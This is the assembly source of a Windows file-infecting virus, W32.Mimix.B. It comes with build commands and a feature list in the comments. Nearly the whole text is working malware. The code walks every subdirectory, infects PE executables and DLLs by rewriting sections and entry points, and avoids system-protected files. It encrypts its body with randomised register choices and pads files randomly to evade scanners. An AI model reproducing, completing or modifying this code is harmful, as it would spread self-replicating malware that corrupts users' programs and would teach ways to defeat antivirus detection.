   ; comment ;)
   ; W32.Mimix.B by roy g biv
   ;
   ; some of its features:
   ; - parasitic direct-action infector of PE exe/dll (but not looking at suffix)
   ; - infects files in current directory and all subdirectories
   ; - directory traversal is linked-list instead of recursive to reduce stack size
   ; - reloc section inserter/last section appender
   ; - auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
   ; - uses CRCs instead of API names
   ; - uses SEH for common code exit
   ; - section attributes are never altered (virus is not self-modifying)
   ; - no infect files with data outside of image (eg self-extractors)
   ; - no infect files protected by SFC/SFP (including under Windows XP)
   ; - infected files are padded by random amounts to confuse tail scanners
   ; - uses SEH walker to find kernel address (no hard-coded addresses)
   ; - correct file checksum without using imagehlp.dll :) 100% correct algorithm
   ; ---
   ;
   ;   optimisation tip: Windows appends ".dll" automatically, so this works:
   ;         push "cfs"
   ;         push esp
   ;         call LoadLibraryA
   ; ---
   ;
   ; to build this thing:
   ; tasm
   ; ----
   ; tasm32 /ml /m3 mimix
   ; tlink32 /B:400000 /x mimix,,,import32
   ;
   ; Virus is not self-modifying, so no need to alter section attributes
   ; ---
   ;
   ; We're in the middle of a phase transition:
   ; a butterfly flapping its wings at
   ; just the right moment could
   ; cause a storm to happen.
   ; -I'm trying to understand-
   ; I'm at a moment in my life-
   ; I don't know where to flap my wings.
   ; (Danny Hillis)
   ;
   ; (;

   .686 ;cmov
   .model  flat

   extern  MessageBoxA:proc
   extern  ExitProcess:proc

   .data
   include mimix.inc

   dropper         label   near
           mov     edx, krncrc_count
           mov     ebx, offset krnnames
           mov     edi, offset krncrcbegin
           call    create_crcs
           mov     edx, 1
           mov     ebx, offset sfcnames
           mov     edi, offset sfccrcbegin
           call    create_crcs
   ;-----------------------------------------------------------------------------
   ;everything before this point is dropper code
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;main virus body.  everything happens in here
   ;-----------------------------------------------------------------------------

   mimix_inf       proc    near
           push    offset do_message                ;replaced by host entrypoint
           xor     esi, esi
           lods    dword ptr fs:[esi]
           push    eax
           mov     dword ptr fs:[esi - 4], esp
           inc     eax

   walk_seh        label   near
           dec     eax
           xchg    esi, eax
           lods    dword ptr [esi]
           inc     eax
           jne     walk_seh
           enter   ((size findlist - 5) and -4) + ((statelen + 1) shl 2), 0
                                                   ;Windows NT/2000/XP enables alignment check exception
                                                   ;so some APIs fail if buffer is not dword aligned
                                                   ;-5 to align at 2 dwords earlier
                                                   ;because EBP saved automatically
                                                   ;and other register saved next
                                                   ;statelen for RNG cache
           push    eax                             ;zero findprev in findlist
           lods    dword ptr [esi]
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   krncrcbegin     label   near
           dd      (krncrc_count + 1) dup (0)

   ;-----------------------------------------------------------------------------
   ;get SFC support if available
   ;-----------------------------------------------------------------------------

           call    load_sfc
           db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)
           db      "MiMiX - roy g biv"             ;like nothing you've ever seen before

   load_sfc        label   near
           call    dword ptr [esp + krncrcstk.kLoadLibraryA]
           test    eax, eax
           jne     found_sfc
           push    'cfs'                           ;Windows 2000
           push    esp
           call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
           pop     ecx
           test    eax, eax
           je      sfcapi_push

   found_sfc       label   near
           inc     eax
           xchg    edi, eax
           call    find_mzhdr

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   sfccrcbegin     label   near
           dd      0, 0
           pop     eax

   sfcapi_push     label   near
           push    eax

   ;-----------------------------------------------------------------------------
   ;swap CreateFileW and CreateFileMappingA because of alphabet order
   ;-----------------------------------------------------------------------------

           mov     ebx, esp
           lea     esi, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
           mov     edi, esi
           lods    dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           stos    dword ptr [edi]

   ;-----------------------------------------------------------------------------
   ;determine platform and dynamically select function types (ANSI or Unicode)
   ;so for Windows NT/2000/XP this code handles files that no ANSI function can open
   ;-----------------------------------------------------------------------------

           call    dword ptr [ebx + krncrcstk.kGetVersion]
           shr     eax, 1fh                        ;treat 9x and Win32s as ANSI
                                                   ;safer than using AreFileApisANSI()
           lea     ebp, dword ptr [eax * 4 + ebx]
           lea     esi, dword ptr [ebx + size krncrcstk]
           call    dword ptr [ebx + krncrcstk.kGetTickCount]
           lea     edi, dword ptr [esi + ((size findlist + 3) and -4)]
           call    randinit

   ;-----------------------------------------------------------------------------
   ;non-recursive directory traverser
   ;-----------------------------------------------------------------------------

   scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
           push    '*'                             ;ANSI-compatible Unicode findmask
           mov     eax, esp
           lea     ebx, dword ptr [esi + findlist.finddata]
           push    ebx
           push    eax
           call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
           pop     ecx
           mov     dword ptr [esi + findlist.findhand], eax
           inc     eax
           je      find_prev

           ;you must always step forward from where you stand

   test_dirfile    label   near
           mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
           lea     edi, dword ptr [esi + findlist.finddata.cFileName]
           test    al, FILE_ATTRIBUTE_DIRECTORY
           je      test_file
           cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
           je      find_next

   ;-----------------------------------------------------------------------------
   ;enter subdirectory, and allocate another list node
   ;-----------------------------------------------------------------------------

           push    edi
           call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
           xchg    ecx, eax
           jecxz   find_next
           push    size findlist
           push    GMEM_FIXED
           call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
           xchg    ecx, eax
           jecxz   step_updir
           xchg    esi, ecx
           mov     dword ptr [esi + findlist.findprev], ecx
           jmp     scan_dir

   find_next       label   near
           lea     ebx, dword ptr [esi + findlist.finddata]
           push    ebx
           mov     edi, dword ptr [esi + findlist.findhand]
           push    edi
           call    dword ptr [ebp + krncrcstk.kFindNextFileW]
           test    eax, eax
           jne     test_dirfile

   ;-----------------------------------------------------------------------------
   ;close find, and free list node if not list head
   ;-----------------------------------------------------------------------------

           mov     ebx, esp
           push    edi
           call    dword ptr [ebx + krncrcstk.kFindClose]

   find_prev       label   near
           mov     ecx, dword ptr [esi + findlist.findprev]
           jecxz   mimix_exit
           push    esi
           mov     esi, ecx
           call    dword ptr [ebx + krncrcstk.kGlobalFree]

   step_updir      label   near

   ;-----------------------------------------------------------------------------
   ;the ANSI string ".." can be used, even on Unicode platforms
   ;-----------------------------------------------------------------------------

           push    '..'
           org     $ - 1                           ;select top 8 bits of push
   mimix_exit      label   near
           int     3                               ;game over

           push    esp
           call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
           pop     eax
           jmp     find_next

   test_file       label   near

   ;-----------------------------------------------------------------------------
   ;get full path and convert to Unicode if required (SFC requires Unicode path)
   ;-----------------------------------------------------------------------------

           push    eax                             ;save original file attributes for close
           mov     eax, ebp
           enter   MAX_PATH * 2, 0
           mov     ecx, esp
           push    eax
           push    esp
           push    ecx
           push    MAX_PATH
           push    edi
           call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
           xchg    edi, eax
           pop     eax
           xor     ebx, ebx
           call    dword ptr [ebp + 8 + krncrcstk.kGetVersion]
           test    eax, eax
           jns     call_sfcapi
           mov     ecx, esp
           xchg    ebp, eax
           enter   MAX_PATH * 2, 0
           xchg    ebp, eax
           mov     eax, esp
           push    MAX_PATH
           push    eax
           inc     edi
           push    edi
           push    ecx
           push    ebx                             ;use default translation
           push    ebx                             ;CP_ANSI
           call    dword ptr [ebp + 8 + krncrcstk.kMultiByteToWideChar]

   call_sfcapi     label   near

   ;-----------------------------------------------------------------------------
   ;don't touch protected files
   ;-----------------------------------------------------------------------------

           mov     ecx, dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
           xor     eax, eax                        ;fake success in case of no SFC
           jecxz   leave_sfc
           push    esp
           push    ebx
           call    ecx

   leave_sfc       label   near
           leave
           test    eax, eax
           jne     restore_attr
           call    set_fileattr
           push    ebx
           push    ebx
           push    OPEN_EXISTING
           push    ebx
           push    ebx
           push    GENERIC_READ or GENERIC_WRITE
           push    edi
           call    dword ptr [ebp + krncrcstk.kCreateFileW]
           xchg    ebx, eax
           call    test_infect
           db      81h                             ;mask CALL
           call    infect_file                     ;Super Nashwan power ;)
           lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
           push    eax
           sub     eax, 8
           push    eax
           push    0
           push    ebx
           call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
           push    ebx
           call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]

   restore_attr    label   near
           pop     ebx                             ;restore original file attributes
           call    set_fileattr
           jmp     find_next
   scan_dir        endp

   init_findmz     label   near
           inc     eax
           xchg    edi, eax

   find_mzhdr      label   near

   ;-----------------------------------------------------------------------------
   ;do not use hard-coded kernel address values because it is not portable
   ;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
   ;they will maybe change again for every new release
   ;-----------------------------------------------------------------------------

           dec     edi                             ;sub 64kb
           xor     di, di                          ;64kb align
           call    is_pehdr
           jne     find_mzhdr
           mov     ebx, edi
           pop     edi

   ;-----------------------------------------------------------------------------
   ;parse export table
   ;-----------------------------------------------------------------------------

           mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
           lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
           lods    dword ptr [esi]                 ;Export Address Table RVA
           lea     edx, dword ptr [ebx + eax]
           lods    dword ptr [esi]                 ;Name Pointer Table RVA
           lea     ecx, dword ptr [ebx + eax]
           lods    dword ptr [esi]                 ;Ordinal Table RVA
           lea     ebp, dword ptr [ebx + eax]
           mov     esi, ecx

   push_export     label   near
           push    ecx

   get_export      label   near
           lods    dword ptr [esi]
           push    ebx
           add     ebx, eax                        ;Name Pointer VA
           or      eax, -1

   crc_outer       label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   crc_inner       label   near
           add     eax, eax
           jnb     crc_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   crc_skip        label   near
           loop    crc_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      crc_outer
           pop     ebx
           cmp     dword ptr [edi], eax
           jne     get_export

   ;-----------------------------------------------------------------------------
   ;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
   ;this allows to push addresses onto the stack, and the order is known
   ;-----------------------------------------------------------------------------

           pop     ecx
           mov     eax, esi
           sub     eax, ecx                        ;Name Pointer Table VA
           shr     eax, 1
           movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
           mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
           add     eax, ebx
           push    eax
           scas    dword ptr [edi]
           cmp     dword ptr [edi], 0
           jne     push_export
           scas    dword ptr [edi]
           jmp     edi

   ;-----------------------------------------------------------------------------
   ;look for MZ and PE file signatures
   ;-----------------------------------------------------------------------------

   is_pehdr        proc    near                    ;edi -> map view
           cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
           jne     pehdr_ret
           mov     esi, dword ptr [edi + mzhdr.mzlfanew]
           add     esi, edi
           lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
           add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

   pehdr_ret       label   near
           ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
   is_pehdr        endp

   ;-----------------------------------------------------------------------------
   ;reset/set read-only file attribute
   ;-----------------------------------------------------------------------------

   set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
           push    ebx
           lea     edi, dword ptr [esi + findlist.finddata.cFileName]
           push    edi
           call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
           ret                                     ;edi -> filename
           db      "01/03/08"                      ;welcome to the future
   set_fileattr    endp

   ;-----------------------------------------------------------------------------
   ;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
   ;-----------------------------------------------------------------------------

   test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
           call    map_view
           mov     ebp, esi
           call    is_pehdr
           jne     inftest_ret
           lods    dword ptr [esi]
           cmp     ax, IMAGE_FILE_MACHINE_I386
           jne     inftest_ret                     ;only Intel 386+
           shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
           lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
           mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

   ;-----------------------------------------------------------------------------
   ;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
   ;-----------------------------------------------------------------------------

           test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
           jne     inftest_ret
           add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate

   ;-----------------------------------------------------------------------------
   ;if file is a .dll, then we require an entry point function
   ;-----------------------------------------------------------------------------

           lods    dword ptr [esi]
           xchg    ecx, eax
           test    ah, IMAGE_FILE_DLL shr 8
           je      test_system
           jecxz   inftest_ret

   ;-----------------------------------------------------------------------------
   ;32-bit executable file...
   ;-----------------------------------------------------------------------------

   test_system     label   near
           and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
           cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
           jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

   ;-----------------------------------------------------------------------------
   ;the COFF magic value is not checked because Windows ignores it anyway
   ;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
   ;-----------------------------------------------------------------------------

           mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
           cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
           jnbe    inftest_ret
           cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
           jb      inftest_ret
           shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
           jb      inftest_ret

   ;-----------------------------------------------------------------------------
   ;avoid files which seem to contain attribute certificates
   ;because one of those certificates might be a digital signature
   ;-----------------------------------------------------------------------------

           cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], eax
           jnbe    inftest_ret

   ;-----------------------------------------------------------------------------
   ;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
   ;the Optional Header can be larger than the offset of the last directory
   ;remember: even if you have not seen it does not mean that it does not happen :)
   ;-----------------------------------------------------------------------------

           movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
           add     eax, edx
           mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pecodebase]
           lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
           lods    dword ptr [esi]
           add     eax, dword ptr [esi]
           cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
           jne     inftest_ret                     ;file contains appended data
           add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ebx
           inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                   ;skip call mask

   inftest_ret     label   near
           int     3

   ;-----------------------------------------------------------------------------
   ;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
   ;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
   ;-----------------------------------------------------------------------------

   open_append     proc    near
           call    dword ptr [esp + size mapstack - 4 + krncrcstk.kGetTickCount]
           and     eax, RANDPADMAX - 1
           add     ax, small ((((offset mimix_codeend - offset mimix_inf) + 74h) and -4) + RANDPADMIN)

   ;-----------------------------------------------------------------------------
   ;create file map, and map view if successful
   ;-----------------------------------------------------------------------------

   map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
           cdq
           add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
           push    eax
           mov     ecx, esp
           push    eax                             ;MapViewOfFile
           push    edx                             ;MapViewOfFile
           push    edx                             ;MapViewOfFile
           push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
           push    edx
           push    eax
           push    edx
           push    PAGE_READWRITE
           push    edx
           push    ebx
           call    dword ptr [ecx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                   ;ANSI map is allowed because of no name
           push    eax
           xchg    edi, eax
           call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
           pop     ecx
           xchg    edi, eax                        ;should succeed even if file cannot be opened
           pushad
           call    unmap_seh
           pop     eax
           pop     eax
           pop     esp
           xor     eax, eax
           pop     dword ptr fs:[eax]
           pop     eax
           popad                                   ;SEH destroys all registers
           push    eax
           push    edi
           call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
           call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
           pop     eax
           ret

   unmap_seh       proc    near
           cdq
           push    dword ptr fs:[edx]
           mov     dword ptr fs:[edx], esp
           jmp     dword ptr [esp + mapsehstk.mapsehsehret]
   unmap_seh       endp
   map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
   open_append     endp

   ;-----------------------------------------------------------------------------
   ;infect file
   ;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
   ;               bytes) to confuse scanners that look at end of file (also
   ;               infection marker)
   ;               if reloc table is not in last section (taken from relocation
   ;               field in PE header, not section name), then append to last
   ;               section.  otherwise, move relocs down and insert code into
   ;               space (to confuse people looking at end of file.  they will
   ;               see only relocation data and garbage or many zeroes)
   ;               entry point is altered to point to our code.  very simple
   ;-----------------------------------------------------------------------------

   infect_file     label   near                    ;esi -> findlist, edi = map view
           call    open_append

   delta_label     label   near
           push    ecx
           push    edi
           mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
           lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
           xor     ecx, ecx
           imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
           add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
           lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
           lods    dword ptr [esi]
           mov     cx, ((offset mimix_codeend - offset mimix_inf) + 7ch) and -4
           mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
           push    eax
           add     eax, ecx
           dec     edx
           add     eax, edx
           not     edx
           and     eax, edx                        ;file align last section
           mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

   ;-----------------------------------------------------------------------------
   ;raw size is file aligned.  virtual size is not required to be section aligned
   ;so if old virtual size is larger than new raw size, then size of image does
   ;not need to be updated, else virtual size must be large enough to cover the
   ;new code, and size of image is section aligned
   ;-----------------------------------------------------------------------------

           mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
           cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
           jnb     test_reloff
           mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
           add     eax, ebp
           mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
           dec     edx
           add     eax, edx
           not     edx
           and     eax, edx
           mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

   ;-----------------------------------------------------------------------------
   ;if relocation table is not in last section, then append to last section
   ;otherwise, move relocations down and insert code into space
   ;-----------------------------------------------------------------------------

   test_reloff     label   near
           test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
           jne     copy_code
           cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
           jb      copy_code
           mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
           add     eax, ebp
           cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
           jnb     copy_code
           add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
           pop     eax
           push    esi
           add     edi, dword ptr [esi]
           lea     esi, dword ptr [edi + eax - 1]
           lea     edi, dword ptr [esi + ecx]
           xchg    ecx, eax
           std
           rep     movs byte ptr [edi], byte ptr [esi]
           cld
           pop     esi
           pop     edi
           push    edi
           push    ecx
           xchg    ecx, eax

   copy_code       label   near
           pop     edx
           add     ebp, edx
           add     edx, dword ptr [esi]
           add     edi, edx

   ;-----------------------------------------------------------------------------
   ;section attributes are always altered to executable because for Windows XP SP2
   ;you can remove that bit, if you want, but we need the writable bit for RNG
   ;-----------------------------------------------------------------------------

           or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

   ;-----------------------------------------------------------------------------
   ;alter entry point
   ;-----------------------------------------------------------------------------

           add     ebp, 24h
           xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], ebp
           add     ebp, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
           mov     esi, offset encrypted - offset delta_label
           add     esi, dword ptr [esp + infectstk.infseh.mapsehinfret]
                                                   ;delta offset
           mov     dword ptr [esi + (offset mimix_inf - offset encrypted) + 1], ebp
           push    ebx

   rand_reg        label   near
           call    random
           and     al, 7
           cmp     al, 4
           je      rand_reg
           xor     ebx, ebx
           mov     bh, al
           add     al, 58h
           stos    byte ptr [edi]
           mov     ecx, dword ptr [esi + 9]
           push    ecx
           shr     cl, 3
           and     cl, 7
           mov     bl, cl
           mov     ah, 1
           shl     ah, cl
           add     ah, 10h                         ;disallow esp and in-use reg
           xor     edx, edx

   ;-----------------------------------------------------------------------------
   ;map used register and also find the unused register
   ;-----------------------------------------------------------------------------

           mov     al, byte ptr [esi]
           and     al, 0fh
           bts     eax, eax
           and     al, 7
           cmp     al, bh
           cmove   edx, esi

   ;-----------------------------------------------------------------------------
   ;replace any conflicting move with spare register
   ;-----------------------------------------------------------------------------

           mov     al, 3ch
           mov     cl, 0b7h

   find_free       label   near
           add     al, 8
           inc     ecx
           shr     ah, 1
           jb      find_free
           test    edx, edx
           je      skip_mov1
           mov     byte ptr [edx], cl

   skip_mov1       label   near
           cmp     bl, bh
           jne     skip_mov2
           mov     byte ptr [esi + 9], al
           mov     byte ptr [esi + 33h], al

   skip_mov2       label   near
           pop     edx
           mov     bl, dh
           and     bl, 7
           cmp     bl, bh
           jne     skip_mov3
           push    ecx
           add     cl, 48h
           mov     bl, cl
           sub     cl, 18h
           mov     byte ptr [esi + 39h], cl
           pop     ecx

   skip_mov3       label   near
           imul    edx, ebx, 8
           mov     al, dh
           add     al, bl
           mov     byte ptr [esi + 0ah], al
           mov     byte ptr [esi + 34h], al
           mov     bl, cl
           and     bl, 7
           imul    edx, ebx, 8
           push    6
           pop     ecx
           push    esi

   ;-----------------------------------------------------------------------------
   ;replace all conflicting arithmetic operations with spare register
   ;-----------------------------------------------------------------------------

   swap_reg        label   near
           mov     al, byte ptr [esi + 0dh]
           mov     ah, al
           and     ax, 3807h
           cmp     ah, dh
           jne     skip_mov4
           mov     ah, dl

   skip_mov4       label   near
           cmp     al, bh
           jne     skip_mov5
           mov     al, bl

   skip_mov5       label   near
           add     al, ah
           add     al, 0c0h
           mov     byte ptr [esi + 0dh], al
           lods    dword ptr [esi]
           cmp     cl, 6
           je      skip_incesi
           lods    dword ptr [esi]

   skip_incesi     label   near
           loop    swap_reg
           pop     esi
           xor     bl, bl
           lea     ebp, dword ptr [edi + 20h]
           xchg    edi, ebp
           lea     eax, dword ptr [ebx + 0e8df70ddh]
           stos    dword ptr [edi]
           mov     eax, -29h
           stos    dword ptr [edi]
           mov     cl, 4

   assign_vars     label   near
       call    random
       mov dword ptr [ecx * 8 + esi + 0ah], eax
           neg     ecx
       mov dword ptr [ecx * 8 + esi + (offset encryptor - offset encrypted) + 2dh], eax
           neg     ecx
           loop    assign_vars
           bswap   ebx
           dec     ecx
           xchg    edi, ebp

   ;-----------------------------------------------------------------------------
   ;randomly order movq lines
   ;-----------------------------------------------------------------------------

   reorder         label   near
           call    random
           and     eax, 7
           btr     ecx, eax
           jnb     reorder
           shl     al, 3
           mov     edx, eax

   rand_slot       label   near
           call    random
           and     eax, 7
           add     al, 8
           btr     ecx, eax
           jnb     rand_slot
           sub     al, 8
       shl     al, 3
           push    eax
           mov     ah, dl
           bswap   eax
       lea eax, dword ptr [ebx + eax + 406f0fh]
       stos    dword ptr [edi]
           pop     eax
           add     edx, esi
           add     eax, ebp
           xchg    esi, edx
       xchg    edi, eax
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           xchg    esi, edx
       xchg    edi, eax
           test    cl, cl
           jne     reorder
           mov     ecx, offset mimix_codeend - offset mimix_inf
           sub     esi, offset encrypted - offset mimix_inf
           add     edi, 58h
           push    edi
           rep     movs byte ptr [edi], byte ptr [esi]
           pop     eax
           call    encryptor
           pop     ebx
           pop     edi

   ;-----------------------------------------------------------------------------
   ;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
   ;-----------------------------------------------------------------------------

           xor     ecx, ecx
           xchg    dword ptr [ebx], ecx
           jecxz   infect_ret
           cdq
           pop     ecx
           push    ecx
           inc     ecx
           shr     ecx, 1
           clc

   calc_checksum   label   near
           adc     dx, word ptr [edi]
           inc     edi
           inc     edi
           loop    calc_checksum
           pop     dword ptr [ebx]
           adc     dword ptr [ebx], edx            ;avoid common bug.  ADC not ADD

   infect_ret      label   near
           int     3                               ;common exit using SEH
           db      "*4U2NV*"                       ;that is, unless you're reading this
   test_infect     endp

   ;-----------------------------------------------------------------------------
   ;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
   ;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
   ;asm port and size optimise by rgb in 2002
   ;-----------------------------------------------------------------------------

   randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
           pushad
           push    edi
           or      eax, 1
           mov     ecx, statelen

   init_loop       label   near
           stos    dword ptr [edi]
           mov     edx, 69069
           mul     edx                             ;Knuth label   near x_new = x_old * 69069
           loop    init_loop
           inc     ecx                             ;force reload
           call    initdelta

   initdelta       label   near
           pop     edi
           add     edi, offset randvars - offset initdelta
           xchg    ecx, eax
           stos    dword ptr [edi]
           pop     eax
           stos    dword ptr [edi]
           stos    dword ptr [edi]
           popad
           ret
   randinit        endp

   random          proc    near
           pushad
           call    randelta

   randvars        label   near
           db      'rgb!'                          ;numbers left
           db      'rgb!'                          ;next pointer
           db      'rgb!'                          ;state pointer

   randelta        label   near
           pop     esi
           push    esi
           lods    dword ptr [esi]
           xchg    ecx, eax
           lods    dword ptr [esi]
           xchg    esi, eax
           loop    random_ret
           mov     cx, statelen - period
           mov     esi, dword ptr [eax]
           lea     ebx, dword ptr [esi + (period * 4)]
           mov     edi, esi
           push    esi
           lods    dword ptr [esi]
           xchg    edx, eax
           call    twist
           pop     ebx
           mov     cx, period - 1
           push    ecx
           push    ebx
           call    twist
           pop     esi
           push    esi
           inc     ecx
           call    twist
           xchg    edx, eax
           pop     esi
           pop     ecx
           inc     ecx

   random_ret      label   near
           lods    dword ptr [esi]
           mov     edx, eax
           shr     eax, tshiftU
           xor     eax, edx
           mov     edx, eax
           shl     eax, tshiftS
           and     eax, tmaskB
           xor     eax, edx
           mov     edx, eax
           shl     eax, tshiftT
           and     eax, tmaskC
           xor     eax, edx
           mov     edx, eax
           shr     eax, tshiftL
           xor     eax, edx
           pop     edi
           mov     dword ptr [esp + 1ch], eax      ;eax in pushad
           xchg    ecx, eax
           stos    dword ptr [edi]
           xchg    esi, eax
           stos    dword ptr [edi]
           popad
           ret
   random          endp

   twist           proc    near
           lods    dword ptr [esi]
           push    eax
           add     eax, eax                        ;remove highest bit
           add     edx, edx                        ;test highest bit
           rcr     eax, 2                          ;merge bits and test lowest bit
           jnb     twist_skip                      ;remove branch but larger using
           xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx

   twist_skip      label   near
           xor     eax, dword ptr [ebx]
           add     ebx, 4
           stos    dword ptr [edi]
           pop     edx
           loop    twist
           ret
   twist           endp

   encrypted       label   near
           mov     ecx, (offset mimix_codeend - offset mimix_inf + 4) and -4
           nop
           jmp     short $ + 4

   decrypt         label   near
           mov     ebx, dword ptr [ecx + eax + 4ch]
           xor     ebx, ecx
           jmp     short $ + 4
           add     ebx, '!bgr'
           jmp     short $ + 4
           xor     ebx, '!bgr'
           jmp     short $ + 4
           sub     ebx, '!bgr'
           jmp     short $ + 4
           xor     ebx, '!bgr'
           jmp     short $ + 4
           add     ebx, ecx
           mov     dword ptr [ecx + eax + 4ch], ebx
           jmp     short $ + 4
           sub     ecx, 4
           jne     decrypt - 0ch
           nop

   if (3eh - (offset $ - offset encrypted)) and 80000000h
   err "code is too large"
   endif
           jmp     short $ + 9     ;to skip tail

   encryptor       proc    near
           mov     ecx, (offset mimix_codeend - offset mimix_inf + 4) and -4

   encrypt         label   near
           mov     ebx, dword ptr [ecx + eax - 4]
           sub     ebx, ecx
           xor     ebx, '!bgr'
           jmp     short $ + 2
           add     ebx, '!bgr'
           jmp     short $ + 2
           xor     ebx, '!bgr'
           jmp     short $ + 2
           sub     ebx, '!bgr'
           jmp     short $ + 2
           xor     ebx, ecx
           mov     dword ptr [ecx + eax - 4], ebx
           sub     ecx, 4
           jne     encrypt
           ret
   encryptor       endp

           ;When last comes to last,
           ;  I have little power:
           ;  I am merely an urn.
